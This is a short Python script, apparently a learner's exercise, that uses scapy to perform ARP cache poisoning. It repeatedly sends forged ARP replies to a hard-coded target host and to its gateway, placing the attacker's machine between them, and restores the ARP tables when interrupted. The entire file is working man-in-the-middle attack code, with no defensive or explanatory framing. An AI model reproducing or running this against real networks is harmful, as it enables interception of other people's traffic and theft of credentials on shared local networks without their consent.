import scapy.all as scapy
import time

target_ip = '192.168.8.114'
gateway_ip = '192.168.8.1'
send_packets_count = 0

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0] #return two couple list
    
    return answered_list[0][1].hwsrc #Зачем тут hwsrc?

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)    
    packet = scapy.ARP(op=2, pdst=target_ip,hwdst=target_mac,psrc=spoof_ip) #op = 2 - sent a recieve? that me have that MAC
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip,hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

try:
    while True:
        try:
            while True:
                spoof(target_ip, gateway_ip)
                spoof(gateway_ip, target_ip)
                send_packets_count = send_packets_count + 2
                #print('[+] Packets sent: ' + str(send_packets_count))  - Static output
                print('\r[+] Packets sent: ' + str(send_packets_count), end='')


                time.sleep(2)
        except:
            time.sleep(2)
except KeyboardInterrupt:
    print('[+] Deteckted CTRL + C ..... Ressetting ARP tables.....')
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)